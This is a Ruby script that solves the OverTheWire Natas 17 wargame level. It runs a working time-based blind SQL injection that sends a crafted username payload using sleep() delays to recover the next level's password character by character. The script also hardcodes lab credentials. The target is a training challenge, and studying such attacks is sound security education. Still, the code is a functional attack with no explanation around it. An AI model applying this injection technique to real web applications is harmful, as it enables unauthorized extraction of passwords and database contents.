#!/usr/bin/ruby

require 'net/http'
require 'uri'
require 'colorize'

password_18_founded = "8NEDUUxg8kFgPV84uLwvZk"
password_18=""
test_loop = "just for detect random timeout and incorrent chars added"
chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
uri = URI.parse("http://natas17.natas.labs.overthewire.org/")
request = Net::HTTP::Post.new(uri)
request.basic_auth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")

while(password_18.length<=31)
  unless password_18!=test_loop
      puts "password in loop".colorize(:red)

      password_18=password_18.delete_suffix(password_18[-1]) 
      puts "New Password #{password_18}".colorize(:green)  
  end
  test_loop = password_18
  for char in chars do
    puts "Testing #{char}"
    param = 'natas18" AND password LIKE binary "' +password_18 +char + '%" AND sleep(4) # '
    puts "    "+param
    request.set_form_data(
      "username" => param,
    )
    t=Time.now
    begin
    response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == "https",:read_timeout =>3) do |http|
      http.request(request)
    end
        rescue Timeout::Error => e
          puts "We Found #{char}".colorize(:yellow)
          puts "Password till now: #{password_18}".colorize(:green)
          password_18+=char
          break
        end
  end
end


puts password_18
